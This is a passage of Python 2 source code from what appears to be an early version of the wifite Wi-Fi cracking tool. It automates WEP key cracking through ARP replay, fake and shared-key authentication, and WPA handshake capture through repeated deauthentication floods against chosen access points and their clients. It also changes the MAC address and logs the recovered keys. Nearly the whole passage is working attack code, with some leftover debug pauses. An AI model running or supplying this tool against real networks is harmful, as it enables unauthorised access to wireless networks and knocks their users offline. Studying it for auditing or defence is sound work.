								'-k','192.168.1.2','-l','192.168.1.100','-y',xor_file,'-w','arp.cap',IFACE]
							proc_replay = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
							proc_replay.wait()
							result=proc_replay.communicate()[0]
							if result == None:
								result='none'
							else:
								result = result.strip()
							
							if result.lower().find('Wrote packet'):
								# remove the .xor file so we don't mistake it later on
								subprocess.call(['rm','-rf',xor_file])
								
								print GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+G+'replaying keystream with arp-replay...'
							
								cmd=['aireplay-ng','-2','-r','arp.cap','-F',IFACE]
								proc_replay = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), \
												stderr=open(os.devnull, 'w'))
								replaying=True
							else:
								#invalid keystream
								print R+'['+get_time(WEP_MAXWAIT,TIME_START)+'] unable to forge arp packet'
								break
					else:
						# attack is still going strong
						pass
					
					ivs=get_ivs('wep-01.csv')+total_ivs
					
					# check if we have over 10,000 IVS and have not started cracking...
					if started_crack==False and ivs > AUTOCRACK:
						started_crack=True
						# overwrite the current line
						print '\r'+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+W+'started cracking WEP key ('+G+'+'+str(AUTOCRACK)+' ivs'+W+')                                       '
						
						# remove the wep key output file, so we don't get a false-positive
						subprocess.call(['rm','-rf','wepkey.txt'],stdout=open(os.devnull,'w'), stderr=open(os.devnull, 'w'))
						time.sleep(0.1)
						
						# start aircrack
						cmd='aircrack-ng -a 1 -l wepkey.txt -f 2 wep-*.ivs'
						proc_crack=subprocess.Popen(cmd,shell=True,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
					
					# check if we've cracked it
					if os.path.exists('wepkey.txt'):
						stop_attack=True
						try:
							f = open('wepkey.txt', 'r')
							pw = f.readlines()[0].strip()
							f.close()
						except IOError:
							pw='[an unknown error occurred; check wepkey.txt]'
						
						CRACKED += 1
						print GR+'\n['+get_time(WEP_MAXWAIT,TIME_START)+'] '+G+'wep key found for "'+TARGETS[index][8]+'"!'
						print GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+W+'the key is "'+C + pw + W+'", saved in '+G+'log.txt'
						
						# only print the ascii version to the log file if it does not contain non-printable characters
						if to_ascii(pw).find('non-print') == -1:
							logit(datetime()+' cracked WEP key for "'+TARGETS[index][8]+'", the key is: "'+pw+'", in ascii: "' + to_ascii(pw) +'"')
						else:
							logit(datetime()+' cracked WEP key for "'+TARGETS[index][8]+'", the key is: "'+pw+'"')
						
						break # break out of this method's while
					
					# only print if we have new IVS captured
					# remove this if-statement to be more verbose
					if ivs > oldivs: # or VERBOSE
						
						# output for the user
						print '\r'+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+ \
								'] '+W+wepname[wepnum]+' attack on "'+G+TARGETS[index][8]+W+'"',
						print 'captured '+G+ str(ivs) +W+' ivs',
						ivsps = (ivs-oldivs) / 5
						print '('+G+str(ivsps)+W+'/sec)',
						
						if replaying:
							print 'replaying...',
							
						if started_crack:
							print 'cracking...     ',
						sys.stdout.flush()
						oldivs=ivs
					
					time.sleep(1) # wait 5 seconds
					
				except KeyboardInterrupt:
					print R+'\n['+get_time(WEP_MAXWAIT,TIME_START)+'] stopping attack on "'+TARGETS[index][8]+'"...'
					
					# show menu!
					wcount=0 # count number of methods remaining
					for i in xrange(wepnum+1,len(weps)):
						if weps[wepnum] == True:
							wcount += 1
					if wcount == 0:
						menu=''
						opts=''
					elif wcount == 1:
						menu=G+'   [c]ontinue attacking; 1 method left\n'
						opts=G+'c'+W
					else:
						menu=G+'   [c]ontinue attacking; '+str(wcount)+' methods left\n'
						opts=G+'c'+W
					
					# check if there's other targets to attack
					for i in xrange(0,len(ATTACK)):
						if index==ATTACK[i]-1:
							if i < len(ATTACK) - 1:
								# more to come
								if opts != '':
									opts+=', '
								opts=G+'n'+W
								
								if menu=='':
									menu+='G'
								else:
									menu+='O'
								
								if i == len(ATTACK)-2:
									menu=menu+'   [n]ext attack (there is 1 target remaining)\n'
								else:
									menu=menu+'   [n]ext attack (there are '+str(len(ATTACK)-i-1)+' targets remaining)\n'
								break
					
					if len(WPA_CRACK) > 0 and DICT != '' and DICT != 'none':
						if opts != '':
							opts+=', '
						opts+=O+'s'+W
						if len(WPA_CRACK) == 1:
							menu=menu+O+'   [s]kip to the WPA cracking (you have 1 handshake to crack)\n'
						else:
							menu=menu+O+'   [s]kip to the WPA cracking (you have '+str(len(WPA_CRACK))+' handshakes to crack)\n'
					
					if menu!= '':
						opts+=', or '+R+'e'+W
						
						menu=menu+R+'   [e]xit the program completely'
						
						print GR+'\n[+] '+W+'please select a menu option below:'
						print menu
						print GR+'[+] '+W+'enter option ('+opts+'):'+W,
						typed=raw_input()
						
						if typed == 'c':
							# continue with this attack!
							try: # kill the processes
								os.kill(proc_read.pid, signal.SIGTERM)   # airodump-ng
							except OSError:
								pass
							except UnboundLocalError:
								pass
							try:
								os.kill(proc_replay.pid, signal.SIGTERM) # aireplay-ng
							except OSError:
								pass
							except UnboundLocalError:
								pass
							try:
								os.kill(proc_crack.pid, signal.SIGTERM)  # aircrack-ng
							except OSError:
								pass
							except UnboundLocalError:
								pass
							time.sleep(0.1)
							
							subprocess.call(['killall','airodump-ng','aireplay-ng','aircrack-ng'],stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
							time.sleep(0.1)
							
							oldivs=0
							total_ivs += ivs
							
							# back up the old IVS file
							backup=2
							while os.path.exists('wep-0' + str(backup) + '.ivs'):
								backup += 1
							subprocess.call('cp wep-01.ivs wep-0' + str(backup) + '.ivs', shell=True)
							time.sleep(0.1) # grace period
							
							# delete old files
							subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.ivs','wep-01.kismet.csv','wep-01.kismet.netxml'])
							time.sleep(0.1) # grace period
							
							# start the airodump process again
							cmd = ['airodump-ng','-w','wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],\
									'--output-format','csv,ivs',IFACE]
							proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
							
							if started_crack: # we already started cracking, have to continue!
								# remove the wep key output file, so we don't get a false-positive
								subprocess.call(['rm','-rf','wepkey.txt'],stdout=open(os.devnull,'w'),stderr=open(os.devnull, 'w'))
								time.sleep(0.1)
								print 'ABOUT TO RUN AIRCRACK'
								asdf=raw_input()
								# start aircrack
								cmd='aircrack-ng -a 1 -l wepkey.txt -f 2 wep-*.ivs'
								proc_crack = subprocess.Popen(cmd,shell=True,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
								print 'JUST RAN AIRCRACK'
								asdf=raw_input()
							stop_attack=False # do NOT stop the attack!
							
						elif typed=='n':
							#do nothing, next attack starts regardless
							stop_attack=True
						
						elif typed == 's':
							# skip to WPA cracking!
							stop_attack=True
							SKIP_TO_WPA=True
							
						else:
							# 'e' or some other option
							stop_attack=True
							EXIT_PROGRAM=True
					else:
						# no reason to keep running! gtfo
						stop_attack=True
					
					break
			# end of while loop
			print W
			
			# clean up
			
			# only kill aireplay because airodump=capturing and aircrack=cracking!
			try:
				os.kill(proc_replay.pid, signal.SIGTERM) # aireplay-ng
			except OSError:
				pass
			except UnboundLocalError:
				pass
			
			# remove those pesky .xor and .cap files
			subprocess.call('rm -rf arp.cap replay_*.cap wep-01-*.xor',shell=True)
			
			if stop_attack:
				break # break out of for-loop for each method
		
		# end of if statement (checks if we're using the current attack method)
	# end of for-loop through every method
	
	# kill processes
	try:
		os.kill(proc_read.pid, signal.SIGTERM)   # airodump-ng
		os.kill(proc_crack.pid, signal.SIGTERM)  # aircrack-ng
		os.kill(proc_replay.pid, signal.SIGTERM) # aireplay-ng
	except OSError:
		pass
	except UnboundLocalError:
		pass
	
	# clean up airodump
	subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.kismet.csv','wep-01.kismet.netxml','wep-01.ivs'])
	subprocess.call('rm -rf wep-*.ivs', shell=True)
	#subprocess.call('rm -rf wep-*.cap', shell=True)
	
	# change mac back
	if OLD_MAC != '':
		print GR+'[+] '+O+'changing mac back to '+GR+OLD_MAC.lower()+O+'...'
		subprocess.call(['ifconfig',IFACE,'down'])
		subprocess.call(['macchanger','-m',OLD_MAC,IFACE], stdout=open(os.devnull,'w'))
		subprocess.call(['ifconfig',IFACE,'up'])
		OLD_MAC=''
		print GR+'[+] '+G+'mac changed back to original address'
	
	# check if user selected to exit completely
	if EXIT_PROGRAM:
		print R+'[+] the program will now exit'
		print W
		sys.exit(0)

def to_ascii(txt):
	""" attempts to convert the hexidecimal WEP key into ascii
		some passwords are stored as a string converted from hex
		includes the text 'contains non-printable characters' if true, or if length is not even
	"""
	if len(txt) % 2 != 0:
		return '[contains non-printable characters]'
	
	s=''
	wrong=False
	for i in xrange(0, len(txt), 2):
		ch=txt[i:i+2].decode('hex')
		chi=ord(ch)
		if chi >= 32 and chi <= 126 or chi >= 128 and chi <= 254:
			s=s+ch
		else:
			wrong=True
	
	if wrong == True:
		s=s+' [contains non-printable characters]'
	return s

def get_ivs(filename):
	""" opens an airodump csv log file
		returns the number of IVs found in the log
	"""
	try:
		f = open(filename, 'r')
		lines=f.readlines()
		for line in lines:
			if line.find('Authentication') == -1:
				s = line.split(',')
				if (len(s) > 11):
					return int(s[10].strip())
		f.close()
	except IOError:
		# print '[+] filenotfound'
		pass
	
	return -1

def attack_fakeauth(index):
	"""
		attempts to fake-authenticate with the access point (index is the index of TARGETS list)
		checks if SKA is required (checks if a .xor file is created) and tries to use SKA if required
		* SKA IS UNTESTED *
		returns True if it has successfully associated, False otherwise
		
		start 
		howto:
		wrap it all in a loop, doesn't take longer than 1/3rd of WEP_MAXWAIT
		
		  try fake auth
		  if we fake-auth'd, great, return True
		  
		  if SKA is required, deauth the router, 
		   -wait to see if a .xor appears OR we get a cilent
		   -yes
		   
		  if there's no ska but we couldn't fake-auth.. deauth and return False...
		   -might make clients show up for dynamic-client-search later on
	"""
	global TARGETS, IFACE, THIS_MAC, WEP_MAXWAIT
	
	if WEP_MAXWAIT != 0:
		# if maxwait is not null (not endless)
		AUTH_MAXWAIT = WEP_MAXWAIT / 6
	else:
		#if it's endless: give it three minutes
		AUTH_MAXWAIT = 60*3
	
	START_TIME=time.time()
	
	# try to authenticate
	cmd = ['aireplay-ng','-1','0','-a',TARGETS[index][0],'-T','1',IFACE] #'-h',THIS_MAC,IFACE]
	proc_auth = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
	proc_auth.wait()
	txt=proc_auth.communicate()[0]
	
	# we associated, yay!
	if txt.lower().find('association successful') != -1:
		return True
	
	# it's SKA (Shared Key Authentication). this is a BITCH
	elif txt.lower().find('switching to shared key') != -1 or txt.lower().find('rejects open-system') != -1:
		
		print GR+'['+get_time(AUTH_MAXWAIT,START_TIME)+'] '+O+'switching to shared key authentication...'
		
		faked=False
		
		cmd='aireplay-ng -1 1 -a '+TARGETS[index][0]+' -T 2 '+IFACE+' > temp.txt'
		proc_auth = subprocess.Popen(cmd,shell=True)
		
		# we need to loop until we get a .xor file, then fake-auth using the .xor file, and boom we're done
		while time.time() - START_TIME < (AUTH_MAXWAIT / 6):
			
			# deauth clients on the router, so they reconnect and we can get the .xor
			cmd = ['aireplay-ng','-0','1','-a',TARGETS[index][0],IFACE]
			subprocess.call(cmd, stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
			
			# check if we got the xor
			thexor='wep-01-' + TARGETS[index][0].replace(':','_') + '.xor'
			if os.path.exists(thexor):
				# we have a PRGA xor stream, tiem to replay it!
				cmd = ['aireplay-ng','-1','1','-a',TARGETS[index][0],'-y',thexor,'-h',THIS_MAC,IFACE]
				proc_auth = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
				proc_auth.wait()
				
				# remove the xor ( don't need it now )
				subprocess.call(['rm','-rf',thexor])
				
				# read if we successfully authenticated using the .xor
				txt=proc_auth.communicate()[0]
				if txt.lower().find('association successful') != -1:
					faked=True
				
				else:
					# .xor file did not let us authenticate.. smells like a Broken SKA
					print R+'['+sec2hms(AUTH_MAXWAIT-(time.time()-START_TIME)) + \
						  '] invalid .xor file: "Broken SKA?" unable to fake authenticate :('
					faked=False
				break
				
			# aireplay has finished
			elif proc_auth.poll() != None:
				# check output file for aireplay...
				tempfile= open('temp.txt')
				temptxt = tempfile.read()
				if temptxt.lower().find('challenge failure') != -1:
					faked=False
				else: #if temptxt.lower().find('association successful') != -1:
					faked=True
				subprocess.call(['rm','-rf','temp.txt'])
				break
			
			print GR+'['+get_time(AUTH_MAXWAIT, START_TIME)+'] '+W+'sent deauth; listening for client to reconnect...'
			time.sleep(5)
		
		# kill the aireplay instance in case it's still going
		try:
			os.kill(proc_auth.pid, signal.SIGTERM)
		except OSError:
			pass
		except UnboundLocalError:
			pass
		return faked
		
	return False

def attack_wpa(index):
	""" index is the index of the TARGETS list that we are attacking
	    opens airodump to capture whatever happens with the bssid
		sends deauth requests to the router (or a client, if found)
		waits until a handshake it captured, the user hits ctrl+c, OR the timer goes past WPA_MAXWAIT
	"""
	global TARGETS, CLIENTS, IFACE, WPA_CRACK, SKIP_TO_WPA
	TIME_START=time.time()
	
	# logit(datetime()+' started WPA handshake capture for "' + TARGETS[index][8] + '"')
	try:
		subprocess.call(['rm','-rf','wpa-01.cap','wpa-01.csv','wpa-01.kismet.csv','wpa-01.kismet.netxml'])
		time.sleep(0.1)
		
		cmd = ['airodump-ng','-w','wpa','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],IFACE]
		proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
		
		print GR+'['+sec2hms(WPA_MAXWAIT)+'] '+W+'starting wpa handshake capture'
		cmd = ['aireplay-ng','-0','3','-a',TARGETS[index][0]]
		if CLIENTS.get(TARGETS[index][0], None) != None:
			cmd.append('-h')
			cmd.append(CLIENTS.get(TARGETS[index][0]))
		cmd.append(IFACE)
		got_handshake=False
		
		while time.time() - TIME_START < WPA_MAXWAIT or WPA_MAXWAIT == 0:
			proc_deauth = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
			proc_deauth.wait()
			
			print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+'] '+W+'sending 3 deauth packets;                  ',
			sys.stdout.flush()
			
			# check for handshake using aircrack
			crack='echo "" | aircrack-ng -a 2 -w - -e "' + TARGETS[index][8] + '" wpa-01.cap'
			proc_crack = subprocess.Popen(crack, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'), shell=True)
			proc_crack.wait()
			txt=proc_crack.communicate()
			
			if txt[0].find('Passphrase not in dictionary') != -1:
				# we got the handshake
				got_handshake=True
				
				# strip non alpha-numeric characters from the SSID
				# so we can store a 'backup' of the handshake in a .cap file
				temp=TARGETS[index][8]
				temp=re.sub(r'[^a-zA-Z0-9]','',temp)
				
				# check if the file already exists...
				temp2=''
				temp3=1
				while os.path.exists(temp+temp2+'.cap'):
					temp2='-'+str(temp3)
					temp3+=1
				temp=temp+temp2
				
				# copy the cap file for safe-keeping
				subprocess.call(['cp','wpa-01.cap',temp + '.cap'])
				
				print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+ \
						'] '+W+'sending 3 deauth packets; '+G+'handshake captured!'+W+' saved as "'+G+temp+'.cap'+W+'"'
				sys.stdout.flush()
				#logit(datetime()+' got handshake for "'+TARGETS[index][8]+'" stored handshake in "' + temp + '.cap"')
				
				# add the filename and SSID to the list of 'to-crack' after everything's done
				WPA_CRACK.append([temp+'.cap', TARGETS[index][8]])
				break
			
			else:
				# no handshake yet
				print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+'] '+W+'sending 3 deauth packets; '+O+'no handshake yet ',
				sys.stdout.flush()
			
			time.sleep(WPA_TIMEOUT)
		
		if got_handshake==False:
			print R+'\n['+sec2hms(0)+'] unable to capture handshake in time (' + str(WPA_MAXWAIT) + ' sec)'
		
	except KeyboardInterrupt:
		# clean up
		subprocess.call(['rm','-rf','wpa-01.cap','wpa-01.csv','wpa-01.kismet.csv','wpa-01.kismet.netxml'])
		try:
			os.kill(proc_read.pid, signal.SIGTERM)
			os.kill(proc_deauth.pid, signal.SIGTERM)
		except OSError:
			pass
		except UnboundLocalError:
			pass
		
		print R+'\n[+] ^C interrupt, '+O+'stopping capture attack on "' + TARGETS[index][8] + '"...'
		menu=''
		opts=''
		# check if there's other targets to attack
		for i in xrange(0,len(ATTACK)):
			if index==ATTACK[i]-1:
				if i < len(ATTACK) - 1:
					# more to come
					opts=G+'n'+W
					if i == len(ATTACK)-2:
						menu=G+'   [n]ext attack (there is 1 target remaining)\n'
					else:
						menu=G+'   [n]ext attack (there are '+str(len(ATTACK)-i-1)+' targets remaining)\n'
					break
		
		if len(WPA_CRACK) > 0 and DICT != '' and DICT != 'none':
			if opts != '':
				opts+=','
			opts+=O+'s'+W
			if len(WPA_CRACK) == 1:
				menu=menu+O+'   [s]kip to the WPA cracking (you have 1 handshake to crack)\n'
			else:
				menu=menu+O+'   [s]kip to the WPA cracking (you have '+str(len(WPA_CRACK))+' handshakes to crack)\n'
		
		if menu!= '':
			opts+=', or '+R+'e'+W
			
			menu=menu+R+'   [e]xit the program completely'
			
			print GR+'\n[+] '+W+'please select a menu option below:'
			print menu
			print GR+'[+] '+W+'enter option ('+opts+W+'):'+W,
			typed=raw_input()
			
			if typed=='n':
				#do nothing, next attack starts regardless
				return
			elif typed == 's':
				# skip to WPA cracking!
				SKIP_TO_WPA=True
				return
			else:
				print GR+'[+] '+R+'exiting'
				sys.exit(0)
		else:
			# no reason to keep running! gtfo
			return
		
	print W
	# remove airodump log files
	subprocess.call(['rm','-rf','wpa-01.cap','wpa-01.csv','wpa-01.kismet.csv','wpa-01.kismet.netxml'])
	
	# try to kill all processes
	try:
		os.kill(proc_read.pid, signal.SIGTERM)
		os.kill(proc_deauth.pid, signal.SIGTERM)
	except OSError:
		pass
	except UnboundLocalError:
		pass

def get_time(maxwait, starttime):
	""" returns the time remaining based on maxwait and starttime
		returns value in H:MM:SS format
	"""
	if maxwait == 0:
		return 'endless'
	else:
		return sec2hms(maxwait - (time.time() - starttime))

def gettargets():
	""" starts airodump-ng, outputs airodump data to 'wifite-01.csv'
	    searches for 10 seconds if user has selected 'all' essids
		searches only specified channels/encryptions if specified by user
		waits until a certain ssid appears if specified by user
		otherwise, waits for ctrl+c command from user to stop
		then,
		displays the results to the user, asks for which targets to attack
		adds targets to ATTACK list and returns
	"""
	global IFACE, CHANNEL, TARGETS, CLIENTS, ATTACK, ESSID
	TIME_START = time.time()
	waiting = -1
	
	try:
		subprocess.call(['rm','-rf','wifite-01.cap','wifite-01.csv','wifite-01.kismet.csv','wifite-01.kismet.netxml'])
		time.sleep(0.3)
		
		cmd=['airodump-ng','-a','-w','wifite','--output-format','csv']
		if CHANNEL != '0':
			cmd.append('-c')
			cmd.append(CHANNEL)
		cmd.append(IFACE)
		
		proc = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
		
		if ESSID == '':
			print GR+'[+] '+W+'waiting for targets. press '+G+'Ctrl+C'+W+' when ready\n'
		elif ESSID == 'all' or ESSID.startswith('pow>'):
			for i in xrange(10, 0, -1):
				print GR+'\r[+] '+W+'waiting '+G+str(i)+W+' seconds for targets to appear. press '+O+'Ctrl+C'+W+' to skip the wait ',
				sys.stdout.flush()
				time.sleep(1)
				parsetargets()
			
			print '\n'
		else:
			print GR+'[+] '+W+'waiting for "'+G + ESSID +W+'" to appear, press '+O+'Ctrl+C'+W+' to skip...'
		
		old=0
		oldc=0
		while 1:
			time.sleep(1)
			parsetargets()
			
			if ESSID != '' and ESSID != 'all' and not ESSID.startswith('pow>'):
				if waiting==-1:
					for x in xrange(0, len(TARGETS)):
						if TARGETS[x][8].lower() == ESSID.lower():
							print GR+'\n[+] '+W+'found "'+G+ESSID+W+'"! waiting '+G+'5 sec'+W+' for clients...',
							sys.stdout.flush()
							ATTACK=[x+1]
							waiting=0
							break
				else:
					for x in xrange(0, len(TARGETS)):
						if TARGETS[x][8].lower() == ESSID.lower():
							print GR+'\r[+] '+W+'found "'+G+ESSID+W+'"! waiting '+G+str(5-waiting)+' sec'+W+' for clients...',
							waiting += 1
							ATTACK=[x+1]
							
							if waiting == 6:
								break
							
					
					if waiting == 6:
						break
					sys.stdout.flush()
			else:
				"""
				if old != len(TARGETS):
					old = len(TARGETS)
					print '\r['+sec2hms(time.time()-TIME_START)+'] ' + str(old) + ' targets',
					
					if oldc != len(CLIENTS):
						oldc = len(CLIENTS)
						print 'and ' + str(oldc) + ' clients',
					
					print 'found                        ',
				else:
					if oldc != len(CLIENTS):
						oldc = len(CLIENTS)
						print '\r['+sec2hms(time.time()-TIME_START)+'] ' + str(oldc) + ' clients found                 ',
				"""
				print '\r'+GR+'['+sec2hms(time.time()-TIME_START)+ \
						'] '+G+str(len(TARGETS))+W+' targets and '+G+str(len(CLIENTS))+W+' clients found',
				if ESSID == 'all' or ESSID.startswith('pow>'):
					# wait for 10 seconds, then start cracking
					if time.time() - TIME_START >= 10:
						break
				sys.stdout.flush()
			
		print W
		
		os.kill(proc.pid, signal.SIGTERM)
		
	except KeyboardInterrupt:
		#print GR+'[+] '+O+'killing airodump-ng process (pid ' + str(proc.pid) + ') ...'+W
		print ''
		waiting=6
		try:
			os.kill(proc.pid, signal.SIGTERM)
		except UnboundLocalError:
			pass
	
	subprocess.call(['rm','-rf','wifite-01.cap','wifite-01.csv','wifite-01.kismet.csv','wifite-01.kismet.netxml'])
	subprocess.call('rm -rf wifite-01*.xor', shell=True)
	
	if ESSID == 'all':
		
		# add all targets to the list to attack
		ATTACK=xrange(0, len(TARGETS))
		if len(ATTACK) > 0:
			print GR+'[+] '+W+'targeting: ',
			for x in ATTACK:
				print '"'+G + TARGETS[x-1][8] + W+'"',
			print ''
		return
	
	elif ESSID.startswith('pow>'):
		ATTACK=[]
		try:
			power=int(ESSID[4:])
		except ValueError:
			print R+'[!] invalid power level: ' + ESSID + '; exiting'
			print W
			return
		
		print ''
		
		for i in xrange(0, len(TARGETS)):
			try:
				if int(TARGETS[i][5]) >= power:
					print GR+'[+] '+W+'added to attack list: "'+G + TARGETS[i][8] + W+'" ('+G + TARGETS[i][5] + 'dB'+W+')'
					ATTACK.append(i+1)
			except ValueError:
				print R+'[!] invalid AP power level: '+O + TARGETS[i][5] + R+'; moving on'
				continue
		
		# if we didn't add any targets...
		if ATTACK==[]:
			print R+'[+] there are no targets with a power level greater than '+O + str(power) + 'dB'
			print R+'[+] try selecting a '+O+'lower power threshold'
			print W
			sys.exit(0)
		
		print GR+'[+] '+G+str(len(ATTACK))+W+' access points targeted for attack'
		return
		
	elif ESSID != '':
		# see if we found the SSID we're looking for
		if waiting == 6:
			#print '[+] found "' + ESSID + '"!'
			return
		else:
			print GR+'[+] '+R+'unable to find "'+O + ESSID + R+'"'
	
	print ''
	if len(TARGETS) == 0:
		print R+'[!] no targets found! make sure that '+O+'airodump-ng'+R+' is working properly'
		print R+'[!] the program will now exit'
		print W
		sys.exit(0)
	
	print GR+'[+] '+W+'select the '+G+'number(s)'+W+' of the target(s) you want to attack:'
	for i in xrange(0, len(TARGETS)):
		# get power dB
		try:
			tempdb=int(TARGETS[i][5])
		except ValueError:
			tempdb=0
		chcolor='G'
		if (i < 9):
			print '',
		
		print G+str(i+1) +W+'.',
		
		if tempdb >= 60:
			chcolor=G
		elif tempdb >= 40:
			chcolor=O
		else:
			chcolor=R
		
		print chcolor+'"'+ TARGETS[i][8] +'"',
		if len(TARGETS[i][8]) >= 25:
			pass
		elif len(TARGETS[i][8]) > 17:
			print '\t',
		elif len(TARGETS[i][8]) >= 9:
			print '\t\t',
		elif len(TARGETS[i][8].strip()) == 0:
			print '\t\t\t\t',
		else:
			print '\t\t\t',
		print '(' + TARGETS[i][5] + 'dB ',
		print TARGETS[i][2][:3] + ')',
		
		if CLIENTS.get(TARGETS[i][0], None) != None:
			print G+'*CLIENT*'+W
		else:
			print ''
		
	
	print GR+'\n[+] '+W+'for multiple choices, use '+C+'dashes'+W+' for ranges and '+C+'commas'+W+' to separate'
	print GR+'[+] '+W+'example: '+G+'1-3,5-6'+W+' would target targets numbered '+C+'1, 2, 3, 5, 6'
	print GR+'[+] '+W+'to attack all access points, type "'+G+'all'+W+'"'+G
	response = raw_input()
	
	ATTACK=stringtolist(response, len(TARGETS))
	if len(ATTACK) > 0:
		for x in ATTACK:
			print GR+'[+] '+W+'adding "'+G + TARGETS[x-1][8] + W+'" to the attack list'
		print W

def parsetargets():
	"""reads through 'wifite-01.csv' and adds any valid targets to the global list TARGETS """
	global TARGETS, CLIENTS, WEP, WPA
	TARGETS=[]
	CLIENTS={}
	try:
		f = open('wifite-01.csv', 'r')
		clients=False
		lines = f.readlines()
		for line in lines:
			if line.find('Station MAC') != -1:
				clients=True
				
			elif line.find('Authentication') == -1 and clients == False:
				# access point
				temp=line.split(', ')
				if len(temp) >= 12 and temp[len(temp)-2].split() != '':
					if temp[5].find('WPA') != -1 and WPA==True or \
					   temp[5].find('WEP') != -1 and WEP==True:
						# remove uneccessary data
						if temp[6].find(',') != -1:
							# need to split authentication for WPA (CCMP,PSK)
							temp.insert(7, temp[6][temp[6].find(',')+1:])
							temp[6] = temp[6][:temp[6].find(',')]
						temp.pop(1) # remove date/time first seen
						temp.pop(1) # remove date/time last seen
						temp.pop(2) # remove speed
						temp.pop(6) # number of beacons
						temp.pop(7) # LAN ip
						temp.pop(len(temp)-1)
						# get rid of trailing/leading spaces
						temp[1] = temp[1].strip()
						temp[2] = temp[2].strip()
						temp[5] = temp[5].strip()
						temp[6] = temp[6].strip()
						temp[7] = temp[7].strip()
						if int(temp[5]) < 0:
							temp[5] = str(int(temp[5]) + 100)
						if int(temp[7]) == len(temp[8]):
							TARGETS.append(temp)
				
			elif line.find('Station MAC') == -1 and clients == True:
				# client
				temp=line.split(',')
				if len(temp) > 5:
					#CLIENTS.append([ temp[0], temp[5] ])
					if CLIENTS.get(temp[5].strip(), None) == None:
						CLIENTS[temp[5].strip()] = temp[0]
		f.close()
	except IOError:
		print R+'\n[!] the program was unable to capture airodump packets!'
		print R+'[+] please make sure you have properly enabled your device in monitor mode'
		print R+'[+] the program is unable to continue and will now exit'
		print W
		sys.exit(0)
	
	# sort the targets by power
	TARGETS = sorted(TARGETS, key=lambda targets: targets[5], reverse=True)


def stringtolist(s, most):
	"""
	receives string, returns list
	sorts low-to-high, removes duplicates, truncates anything more than 'most'
	'all'   returns entire list (1 to most)
	'a-b'   selection, separated by hyphen, adds everything between and including numbers a and b
	'a,b,c' multiple selection, separated by commas, adds a b and c
	'a'     single selection, just the number, adds a
	"""
	
	lst=[]
	try:
		if s == 'all' or s == '"all"':
			for i in xrange(1, most+1):
				lst.append(i)
		elif s.find(',') == -1 and s.find('-') == -1:
			lst=[int(s)]
		else:
			sub=s.split(',')
			for i in sub:
				if i.find('-') != -1:
					tmp=i.split('-')
					for j in xrange(int(tmp[0]), int(tmp[1]) + 1):
						lst.append(j)
				else:
					lst.append(int(i))
	except ValueError:
		print R+'[+] error! invalid input'+W
	
	lst = sorted(lst)
	
	# remove duplicates
	i = 0
	while i < len(lst) - 1:
		if lst[i] == lst[i+1] or lst[i] > most:
			lst.pop(i)
			i -= 1
		i += 1
	if lst[len(lst)-1] > most:
		lst.pop(len(lst)-1)
	
	return lst

def datetime():
	""" returns current date/time in [yyyy-mm-dd hh:mm:ss] format, used by logit() """
	return '[' + time.strftime("%Y-%m-%d %H:%M:%S") + ']'

def sec2hms(sec):
	""" converts seconds to h:mm:ss format"""
	if sec < 0:
		return '0:00:00'
	s = int(sec)
	h=int(s/3600)
	s=s%3600
	m=int(s/60)
	s=s%60
	result='' + str(h) + ':'
	if m < 10:
		result += '0'
	result += str(m) + ':'
	if s < 10:
		result += '0'
	result += str(s)
	
	return result

main()

# helpful diagram!
# TARGETS list format
# ['XX:XX:XX:XX:XX:XX', '1', 'WPA2WPA', 'CCMP', 'PSK', '48', '0',  '11',  'Belkin.A38E']
#  BSSID,            CHANNEL,  ENC,      CYPH,   ??,   POWER,IVS,SSID_LEN,    SSID
#    0                  1       2         3      4       5    6     7          8
